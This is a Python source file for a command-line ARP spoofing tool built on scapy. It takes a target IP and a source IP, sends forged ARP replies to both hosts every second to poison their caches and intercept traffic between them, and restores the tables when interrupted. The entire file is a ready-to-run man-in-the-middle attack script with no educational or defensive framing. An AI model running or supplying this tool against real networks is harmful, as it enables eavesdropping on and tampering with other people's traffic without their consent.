import scapy.all as scapy
from time import sleep
from argparse import ArgumentParser

def get_arguments():
    parser = ArgumentParser()
    parser.add_argument("-i1", "--target-ip", required=True, help="Target IP", 
    metavar="T.IP", dest="ip1")

    parser.add_argument("-i2", "--source-ip", required=True, help="Source IP",
    metavar="S.IP", dest="ip2")
    
    args = parser.parse_args()
    return args

def spoof(target_ip, source_ip):
    target_mac = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip), 
    timeout=1, verbose=False)[0]
    scapy.send(scapy.ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac[0][1]), 
    count=4, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dest_ip),
    timeout=1, verbose=False)[0][0][1]
    source_mac = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=source_ip),
    timeout=1, verbose=False)[0][0][1]
    scapy.send(scapy.ARP(op=2, psrc=source_ip, pdst=dest_ip, hwsrc=source_mac, hwdst=dest_mac), 
    count=4, verbose=False)

if __name__ == "__main__":
    spc = 0
    args = get_arguments()
    try:
        print("Starting ARP Spoofing")
        while True:
            spoof(str(args.ip1), str(args.ip2))
            spoof(str(args.ip2), str(args.ip1))
            print("\rSent Packages: ", str(spc), end="")
            spc += 2
            sleep(1)
    except KeyboardInterrupt:
        print("\n\nDetected CTRL + C, stopping ARP Spoofing and restoring ARP tables")
        restore(str(args.ip1), str(args.ip2))
        restore(str(args.ip2), str(args.ip1))
    except:
        print("\n\nAn unexpected error has ocurred\n")
